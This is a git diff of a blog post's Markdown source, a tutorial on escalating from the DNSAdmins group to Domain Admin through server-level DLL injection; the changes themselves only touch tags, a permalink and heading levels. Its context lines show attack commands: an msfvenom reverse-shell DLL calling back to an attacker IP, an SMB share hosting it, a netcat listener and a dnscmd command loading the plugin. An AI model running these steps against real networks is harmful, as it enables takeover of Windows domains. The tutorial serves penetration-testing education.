@@ -3,8 +3,8 @@ title: Windows Privilege Escalation: DNSAdmins to Domain Admins - Server Level D
 layout: post
 author: Abhinav Gyawali
 date: 2019-12-21
-tags: privesc, windows, dnsadmin
-
+tags: [privesc, windows, dnsadmin]
+permalink: /windows-privilege-escalation-dnsadmin-to-domaincontroller/
 ---
 
 # Windows Privilege Escalation: DNSAdmins to Domain Admins - Server Level DLL Injection
@@ -34,7 +34,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.211.55.13 LPORT=4444 --platfo
 
 Here, because the Windows machine is of 64 bit achitechture, we're using x64 payload.
 
-#serving the file using SMB Server using smbserver.py, that comes with Python3-Impacket.
+#### Serving the file using SMB Server using smbserver.py, that comes with Python3-Impacket.
 
 ```powershell
 cd /usr/share/doc/python3-impacket/examples
@@ -49,13 +49,13 @@ nc -nvlp 4444
 
 ## Now, in the compromised Windows machine
 
-##### Importing the plugin:
+#### Importing the plugin:
 
 ```powershell
 dnscmd.exe myserver.local /config /serverlevelplugindll \\10.211.55.13\share\plugin.dll
 ```
 
-##### Restarting the service:
+#### Restarting the service:
 
 ```powershell
 sc.exe stop dns
